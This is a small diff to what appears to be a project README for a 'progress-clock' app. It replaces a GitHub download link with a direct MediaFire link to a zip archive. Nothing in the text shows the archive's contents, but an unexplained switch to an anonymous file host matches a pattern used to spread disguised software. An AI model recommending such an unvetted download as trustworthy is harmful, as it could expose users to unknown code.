@@ -5,7 +5,7 @@
 https://progress-clock.vercel.app/
 
 # Download
-link updated on <a href="https://github.com/DoneJoseph" style="color:red; text-decoration: none;">Github</a>
+https://www.mediafire.com/file/idv9anq4tqfb9qx/progress-clock.zip/file
 
 ## Connect with me  
 <div align="center">
